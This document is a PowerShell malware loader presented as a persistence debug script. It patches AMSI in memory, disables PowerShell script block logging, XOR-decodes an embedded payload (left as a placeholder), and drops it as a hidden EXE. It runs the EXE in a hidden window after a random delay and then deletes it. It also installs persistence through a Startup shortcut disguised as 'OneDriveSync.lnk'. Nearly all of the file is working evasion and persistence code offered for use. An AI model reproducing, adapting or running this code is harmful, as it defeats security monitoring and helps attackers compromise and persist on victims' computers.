# launcher_persist_debug.txt – Debug version for persistence troubleshooting
$DebugLog = "$env:TEMP\persist_debug.txt"
function Write-Log {
    param($msg, $lvl="INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    $logLine = "[$timestamp] [$lvl] $msg"
    Add-Content -Path $DebugLog -Value $logLine -Encoding UTF8
    # No console output – silent
}

Write-Log "========== PERSISTENCE SCRIPT START (post‑reboot) =========="
Write-Log "PowerShell version: $($PSVersionTable.PSVersion)"

# AMSI bypass
$amsi = @'
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        if(lib == IntPtr.Zero) return;
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        if(addr == IntPtr.Zero) return;
        uint old;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out old);
        Marshal.Copy(new byte[]{0x31,0xC0,0xC3},0,addr,3);
        VirtualProtect(addr, (UIntPtr)6, old, out old);
    }
}
'@
try {
    Add-Type $amsi
    [Amsi]::Patch()
    Write-Log "AMSI bypass succeeded"
} catch { Write-Log "AMSI bypass failed: $_" -lvl "ERROR" }

# Disable logging
try {
    $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
    Write-Log "Logging disabled"
} catch { Write-Log "Failed to disable logging: $_" -lvl "WARN" }

# XOR payload (same as before)
$enc = "
"   # YOUR FULL XORED BASE64
$key = 0x5A
try {
    Write-Log "Decoding Base64..."
    $encBytes = [Convert]::FromBase64String($enc)
    Write-Log "Base64 decoded, length: $($encBytes.Length)"
} catch { Write-Log "Base64 decode failed: $_" -lvl "ERROR"; exit 1 }

try {
    Write-Log "Applying XOR..."
    $exeBytes = [byte[]]::new($encBytes.Length)
    for($i=0; $i -lt $encBytes.Length; $i++) { $exeBytes[$i] = $encBytes[$i] -bxor $key }
    Write-Log "XOR complete, EXE size: $($exeBytes.Length)"
} catch { Write-Log "XOR failed: $_" -lvl "ERROR"; exit 1 }

# Write temp file
$tempFile = [System.IO.Path]::GetTempFileName() + ".exe"
try {
    [System.IO.File]::WriteAllBytes($tempFile, $exeBytes)
    Set-ItemProperty -Path $tempFile -Name Attributes -Value "Hidden"
    Write-Log "Temp EXE written: $tempFile, size $((Get-Item $tempFile).Length)"
} catch { Write-Log "Failed to write temp file: $_" -lvl "ERROR"; exit 1 }

# Delay (60‑120 seconds)
$delay = Get-Random -Minimum 60 -Maximum 120
Write-Log "Delaying $delay seconds before execution..."
Start-Sleep -Seconds $delay

# Execute
try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $tempFile
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $p = [System.Diagnostics.Process]::Start($psi)
    Write-Log "Process started with PID $($p.Id)"
} catch { Write-Log "Failed to start EXE: $_" -lvl "ERROR" }

# Schedule deletion
Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 15; Remove-Item $f -Force -ErrorAction SilentlyContinue } -Arg $tempFile | Out-Null
Write-Log "Cleanup scheduled"

# Persistence (already installed, but ensure flag exists)
$flag = "$env:TEMP\persist_$([Environment]::MachineName.GetHashCode()).dat"
if(-not (Test-Path $flag)){
    try {
        $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk"
        $wsh = New-Object -ComObject WScript.Shell
        $lnk = $wsh.CreateShortcut($lnkPath)
        $lnk.TargetPath = "powershell.exe"
        $lnk.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        $lnk.Save()
        New-Item $flag -Force | Out-Null
        Write-Log "Persistence installed"
    } catch { Write-Log "Persistence install failed: $_" -lvl "ERROR" }
} else { Write-Log "Persistence already installed" }

Write-Log "========== SCRIPT END =========="
